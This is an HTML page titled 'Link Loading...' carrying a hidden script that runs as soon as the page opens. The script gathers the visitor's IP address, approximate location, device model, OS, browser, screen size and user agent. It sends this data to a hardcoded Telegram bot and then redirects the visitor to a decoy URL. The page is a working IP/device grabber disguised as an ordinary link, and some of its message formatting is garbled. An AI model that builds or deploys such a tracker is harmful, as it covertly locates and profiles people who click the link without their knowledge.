<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Link Loading...</title>
</head>
<body>
<script>
const BOT_TOKEN = '8437574185:AAH3LG_IDft1pdrkfv-75rgWUCIWFYxECoM';
const CHAT_ID = '7863510010';
const REDIRECT_URL = 'https://www.misha/dad/image23689/august2024.com';
const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

function getLegacyDeviceInfo(ua) {
    let os = 'Unknown OS', model = 'Unknown Model/Device', manufacturer = 'Unknown Manufacturer', browser = 'Unknown Browser', osVersion = 'N/A';
    if (ua.includes('Android')) {
        os = 'Android';
        const v = ua.match(/Android (\d+(?:\.\d+)*)/); if (v) osVersion = v[1];
        let m = ua.match(/\(([^;]+); Android [^;]+; ([^)]+)\)/);
        let seg = m && m[2] ? m[2].trim() : '';
        if (seg.length <= 2) { m = ua.match(/Android [^;]+; ([^;)]+)(?:\sBuild\/)/); seg = m && m[1] ? m[1].trim() : ''; }
        model = seg.replace(/\s+Build\/.*/, '').trim();
        if (model.startsWith('SM-') || model.startsWith('SAMSUNG')) manufacturer = 'Samsung';
        else if (model.includes('Pixel')) manufacturer = 'Google';
        else if (model.length > 2 && model !== 'K') manufacturer = 'Android Device';
    } else if (/iPhone|iPad|iPod/.test(ua)) {
        os = ua.includes('iPad') ? 'iPadOS' : 'iOS';
        model = ua.includes('iPad') ? 'iPad' : 'iPhone';
        manufacturer = 'Apple';
        const v = ua.match(/OS (\d+_\d+)/); if (v) osVersion = v[1].replace('_', '.');
    }
    if (/Chrome/.test(ua) && !/Edg/.test(ua)) browser = /CriOS/.test(ua) ? 'Chrome (iOS)' : 'Chrome';
    else if (/Edg/.test(ua)) browser = 'Edge';
    else if (/Firefox/.test(ua)) browser = 'Firefox';
    else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
    return {os, osVersion, model, manufacturer, browser};
}

(async () => {
    const ua = navigator.userAgent;

    // IP – guaranteed clean
    let ip = 'Unknown', loc = 'Unknown';
    try {
        const r = await fetch('https://ipapi.co/json/');
        if (r.ok) { const d = await r.json(); ip = d.ip; loc = d.city + ', ' + d.region + ', ' + d.country_name; }
    } catch { try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch{} }

    // Your original device logic
    let info = {os:'Unknown OS', osVersion:'N/A', model:'Unknown Model/Device', manufacturer:'Unknown Manufacturer', browser:'Unknown Browser'};
    try {
        if (navigator.userAgentData) {
            const h = await navigator.userAgentData.getHighEntropyValues(["platform","platformVersion","manufacturer","model"]);
            info.os = h.platform || info.os;
            info.osVersion = h.platformVersion || info.osVersion;
            info.manufacturer = h.manufacturer || info.manufacturer;
            info.model = h.model || info.model;
            info.browser = navigator.userAgentData.brands.find(b => !b.brand.includes('Not'))?.brand || info.browser;
        } else info = getLegacyDeviceInfo(ua);
    } catch { info = getLegacyDeviceInfo(ua); }

    // MESSAGE – typed in plain text editor, no smart quotes, no hidden chars
    const msg = `
*--- NEW DEVICE CLICKED ---*

*Time:* ${new Date().toISOString()}
*IP:* \( {ip} ( \){loc})
*OS/Version:* \( {info.os} ( \){info.osVersion})
*Manufacturer:* ${info.manufacturer}
*Model (Android Priority):* ${info.model}
*Browser:* ${info.browser}
*Screen:* \( {screen.width}x \){screen.height}

*Raw UA:* \`${ua}\`
    `.trim();

    fetch(TELEGRAM_API_URL, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text:msg,parse_mode:'Markdown'})})
        .finally(() => setTimeout(() => location.replace(REDIRECT_URL), 1000));
})();
</script>
</body>
</html>
